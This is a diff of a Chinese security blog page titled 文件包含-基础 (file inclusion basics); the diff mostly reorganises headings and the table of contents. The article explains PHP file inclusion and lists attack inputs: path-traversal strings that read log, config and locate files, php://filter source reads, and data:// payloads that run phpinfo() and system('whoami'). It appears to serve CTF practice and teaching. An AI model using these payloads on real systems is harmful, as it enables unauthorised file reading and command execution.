@@ -11,7 +11,7 @@
   <meta itemprop="name" content="文件包含-基础">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="265">
+  <meta itemprop="wordCount" content="240">
   <meta itemprop="keywords" content="OWASP,文件包含"><meta property="og:url" content="https://dongyu29.github.io/posts/owasp/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/112/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="文件包含-基础">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\/112\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, 文件包含","wordcount":  265 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, 文件包含","wordcount":  240 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\/112\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>文件包含-基础</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="265 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="240 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,22 +152,57 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#原理">原理</a></li>
+    <li><a href="#分类">分类</a></li>
+    <li><a href="#利用">利用</a>
       <ul>
-        <li></li>
+        <li><a href="#目录遍历">目录遍历</a></li>
+        <li><a href="#日志配置文件">日志,配置文件</a></li>
       </ul>
     </li>
   </ul>
+
+  <ul>
+    <li><a href="#php伪协议">php伪协议</a>
+      <ul>
+        <li><a href="#phpinput">php://input</a></li>
+        <li><a href="#phpfilter">php://filter</a></li>
+      </ul>
+    </li>
+    <li><a href="#其它伪协议的利用">其它伪协议的利用</a>
+      <ul>
+        <li><a href="#phar">phar://</a></li>
+        <li><a href="#zip">zip://</a></li>
+        <li><a href="#datauri-schema">data:URI schema</a></li>
+      </ul>
+    </li>
+    <li><a href="#php支持的协议种类">php支持的协议种类</a>
+      <ul>
+        <li><a href="#1file--访问本地文件系统">1.file:// — 访问本地文件系统</a></li>
+        <li><a href="#2http--访问-https-网址">2.http:// — 访问 HTTP(s) 网址</a></li>
+        <li><a href="#3ftp--访问-ftps-urls">3.ftp:// — 访问 FTP(s) URLs</a></li>
+        <li><a href="#4php--访问各个输入输出流io-streams">4.php:// — 访问各个输入/输出流（I/O streams）</a></li>
+        <li><a href="#5zipbzip2-zlib--压缩流">5.zip://,bzip2://, zlib:// — 压缩流</a></li>
+        <li><a href="#6phar--php-归档">6.phar:// — PHP 归档</a></li>
+        <li><a href="#7data--数据rfc-2397">7.data:// — 数据（RFC 2397）</a></li>
+        <li><a href="#8glob--查找匹配的文件路径模式">8.glob:// — 查找匹配的文件路径模式</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#日志文件包含">日志文件包含</a></li>
+  </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="概述" class="heading-element"><span>0.0.0.1  概述</span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="概述" class="heading-element"><span>概述</span>
   <a href="#%e6%a6%82%e8%bf%b0" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="原理" class="heading-element"><span>0.0.0.1.1  原理</span>
+</h1><h2 id="原理" class="heading-element"><span>原理</span>
   <a href="#%e5%8e%9f%e7%90%86" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p>
 </blockquote>
 <p>php文件包含漏洞通常由以下几个函数引发：</p>
@@ -179,11 +214,11 @@ require_once()    #若文件已经被包含过，则不会再次包含。</p>
 <p>当利用这四个函数来包含文件时，不管文件是什么类型，都会直接作为php文件进行解析，如果被包含的文件中无有效的php代码，则会直接把文件内容输出。</p>
 </blockquote>
 <hr>
-<h6 id="分类" class="heading-element"><span>0.0.0.1.2  分类</span>
+<h2 id="分类" class="heading-element"><span>分类</span>
   <a href="#%e5%88%86%e7%b1%bb" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>LFI(Local File Inclusion)
 本地文件包含漏洞。顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。前面的例子就属于此类。</p>
 </blockquote>
@@ -195,40 +230,52 @@ require_once()    #若文件已经被包含过，则不会再次包含。</p>
 <p>allow_url_fopen = On     #默认为On</p>
 <p>allow_url_include = On    #php5.2之后就默认为Off</p>
 <hr>
-<h6 id="利用" class="heading-element"><span>0.0.0.1.3  利用</span>
+<h2 id="利用" class="heading-element"><span>利用</span>
   <a href="#%e5%88%a9%e7%94%a8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>####### 目录遍历</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>   <span style="color:#ff636f">include</span>(<span style="color:#a6be9d">&#34;inc/&#34;</span> <span style="color:#ff636f">.</span> <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;file&#39;</span>]); <span style="color:#828b96;font-style:italic">?&gt;</span>
+</h2><h3 id="目录遍历" class="heading-element"><span>目录遍历</span>
+  <a href="#%e7%9b%ae%e5%bd%95%e9%81%8d%e5%8e%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>   <span style="color:#ff636f">include</span>(<span style="color:#a6be9d">&#34;inc/&#34;</span> <span style="color:#ff636f">.</span> <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;file&#39;</span>]); <span style="color:#828b96;font-style:italic">?&gt;</span>
 </span></span></code></pre></div><p>linux中这两个文件储存着所有文件的路径，需要root权限:</p>
 <p>?file=../../../../../../../../../var/lib/locate.db
 ?file=../../../../../../../../../var/lib/mlocate/mlocate.db</p>
-<p>####### 日志,配置文件</p>
-<p>?file=../../../../../../../../../var/log/apache/error.log
+<h3 id="日志配置文件" class="heading-element"><span>日志,配置文件</span>
+  <a href="#%e6%97%a5%e5%bf%97%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>?file=../../../../../../../../../var/log/apache/error.log
 ?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf</p>
 <hr>
-<h5 id="伪协议" class="heading-element"><span>0.0.0.2  伪协议</span>
+<h1 id="伪协议" class="heading-element"><span>伪协议</span>
   <a href="#%e4%bc%aa%e5%8d%8f%e8%ae%ae" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="php伪协议" class="heading-element"><span>0.0.0.2.1  php伪协议</span>
+</h1><h2 id="php伪协议" class="heading-element"><span>php伪协议</span>
   <a href="#php%e4%bc%aa%e5%8d%8f%e8%ae%ae" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>关于文件包含漏洞，比较常用的还有php的php://伪协议</p>
 </blockquote>
 <p>这里比较常用的是：</p>
 <p>php://input
 php://filter</p>
-<p>####### php://input</p>
-<p>利用条件：</p>
+<h3 id="phpinput" class="heading-element"><span>php://input</span>
+  <a href="#phpinput" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>利用条件：</p>
 <p>allow_url_include = On</p>
 <p>即可如图所示利用：</p>
 <!-- raw HTML omitted -->
-<p>####### php://filter</p>
-<p>可获取文件内容</p>
+<h3 id="phpfilter" class="heading-element"><span>php://filter</span>
+  <a href="#phpfilter" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>可获取文件内容</p>
 <p>file=php://filter/read=convert.base64-encode/resource=flag.php</p>
 <p>file=php://filter/convert.base64-encode/resource=flag.php</p>
 <blockquote>
@@ -236,21 +283,30 @@ php://filter</p>
 </blockquote>
 <p>通过指定末尾的文件，可以读取经base64编码后的文件源码</p>
 <p><img loading="lazy" src="https://i2.wp.com/img-blog.csdnimg.cn/20200701202853270.png" alt="在这里插入图片描述" srcset="https://i2.wp.com/img-blog.csdnimg.cn/20200701202853270.png?size=small, https://i2.wp.com/img-blog.csdnimg.cn/20200701202853270.png?size=medium 1.5x, https://i2.wp.com/img-blog.csdnimg.cn/20200701202853270.png?size=large 2x" data-title="在这里插入图片描述" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h6 id="其它伪协议的利用" class="heading-element"><span>0.0.0.2.2  其它伪协议的利用</span>
+<h2 id="其它伪协议的利用" class="heading-element"><span>其它伪协议的利用</span>
   <a href="#%e5%85%b6%e5%ae%83%e4%bc%aa%e5%8d%8f%e8%ae%ae%e7%9a%84%e5%88%a9%e7%94%a8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>####### phar://</p>
-<p>可获取压缩包中文件内容</p>
+</h2><h3 id="phar" class="heading-element"><span>phar://</span>
+  <a href="#phar" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>可获取压缩包中文件内容</p>
 <p>事先得知道压缩文件目录结构</p>
 <p>?file=phar://flag.zip/flag.txt</p>
 <p><img loading="lazy" src="https://i2.wp.com/img-blog.csdnimg.cn/20200701202901392.png" alt="在这里插入图片描述" srcset="https://i2.wp.com/img-blog.csdnimg.cn/20200701202901392.png?size=small, https://i2.wp.com/img-blog.csdnimg.cn/20200701202901392.png?size=medium 1.5x, https://i2.wp.com/img-blog.csdnimg.cn/20200701202901392.png?size=large 2x" data-title="在这里插入图片描述" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>####### zip://</p>
-<p>用法同上，但使用zip协议，需要指定<strong>绝对路径</strong>，同时将#编码为%23，之后填上压缩包内的文件才会包含成功</p>
+<h3 id="zip" class="heading-element"><span>zip://</span>
+  <a href="#zip" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>用法同上，但使用zip协议，需要指定<strong>绝对路径</strong>，同时将#编码为%23，之后填上压缩包内的文件才会包含成功</p>
 <p>?file=zip://D:\phpStudy\PHPTutorial\WWW\flag.zip%23flag.txt</p>
 <p><img loading="lazy" src="https://i2.wp.com/imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA0LzA5L0FJVFZxVS5wbmc?x-oss-process=image/format,png" alt="example5" srcset="https://i2.wp.com/imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA0LzA5L0FJVFZxVS5wbmc?x-oss-process=image/format%2cpng&amp;size=small, https://i2.wp.com/imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA0LzA5L0FJVFZxVS5wbmc?x-oss-process=image/format%2cpng&amp;size=medium 1.5x, https://i2.wp.com/imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA0LzA5L0FJVFZxVS5wbmc?x-oss-process=image/format%2cpng&amp;size=large 2x" data-title="example5" class="suffix-invalid suffix-invalid__small suffix-invalid__large" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>####### data:URI schema</p>
-<p>命令执行</p>
+<h3 id="datauri-schema" class="heading-element"><span>data:URI schema</span>
+  <a href="#datauri-schema" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>命令执行</p>
 <p>?file=data:text/plain,<!-- raw HTML omitted -->
 ?file=data:text/plain,<!-- raw HTML omitted -->
 ?file=data:text/plain,<!-- raw HTML omitted --></p>
@@ -260,11 +316,11 @@ php://filter</p>
 <p>?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B       #phpinfo();
 ?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==  #system(&lsquo;whoami&rsquo;);
 ?file=data:text/plain;base64,PD9waHAgZWNobyBgd2hvYW1pYDs/Pg==</p>
-<h6 id="php支持的协议种类" class="heading-element"><span>0.0.0.2.3  php支持的协议种类</span>
+<h2 id="php支持的协议种类" class="heading-element"><span>php支持的协议种类</span>
   <a href="#php%e6%94%af%e6%8c%81%e7%9a%84%e5%8d%8f%e8%ae%ae%e7%a7%8d%e7%b1%bb" class="heading-mark">
